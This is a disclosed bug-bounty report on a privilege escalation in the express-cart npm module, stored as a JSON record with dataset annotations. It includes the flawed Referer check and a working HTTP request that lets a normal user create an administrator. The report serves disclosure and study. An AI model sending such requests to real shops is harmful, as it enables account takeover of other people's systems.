{
  "reported_to": "Node.js third-party modules",
  "reported_by": "patrickrbc ",
  "title": "Privilege escalation allows any user to add an administrator",
  "content": "\nI would like to report privilege escalation in the npm module express-cart.\nIt allows a normal user to add another user with administrator privileges.\nModule\nmodule name: express-cart\nversion: 1.1.5\nnpm page: https://www.npmjs.com/package/express-cart\nModule Description\nexpressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.\nModule Stats\n[10] weekly downloads\nVulnerability\nVulnerability Description\nA deficiency in the access control allows normal users from expressCart to add new users to the application. This behavior by itself might be considered a privilege escalation. However, it was also possible to add the user as administrator.\nSteps To Reproduce:\nFirstly, I noticed that all the endpoints located in the user.js file are not being restricted by the common.restrict middleware, as the other admin routes do. Also, the endpoint /admin/user/insert does not check if the user is admin before adding a new user, which I guess it would be a unlikely behavior.\nThe following code is used to check if it is the first time creating a user:\nCode 204 Bytes\n1// set the account to admin if using the setup form. Eg: First user account\n2let urlParts = url.parse(req.header('Referer'));\n3\n4let isAdmin = false;\n5if(urlParts.path === '/admin/setup'){\n6  isAdmin = true;\n7}\nAs you can see in the above snippet, if you send a request with a Referer containing the string /admin/setup the user added will be considered an admin. For example:\nCode 285 Bytes\n1POST /admin/user/insert HTTP/1.1\n2Host: localhost:1111\n3Referer: http://localhost:1111/admin/setup\n4Content-Type: application/x-www-form-urlencoded\n5Cookie: connect.sid=[NORMAL_USER_COOKIE]\n6\n7usersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nThis vulnerability would allow any registered user to create another user with administrator privileges and takeover the application.\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Privilege Escalation"
  ],
  "screenshots": {},
  "disclosed_date": 1531396620,
  "report_url": "https://hackerone.com/reports/343626",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Identify that the endpoints in user.js are not restricted by the common.restrict middleware."
    ],
    [
      2,
      "Send a POST request to /admin/user/insert with a Referer header containing '/admin/setup' to create a new admin user."
    ]
  ],
  "vuln_description": "A deficiency in the access control allows normal users to add new users with administrator privileges by manipulating the Referer header in the request.",
  "reason": "The vulnerability involves a simple manipulation of the Referer header to bypass access control checks, which is a straightforward and common technique. The lack of middleware restriction on the endpoint is also a clear oversight.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": true
  }
}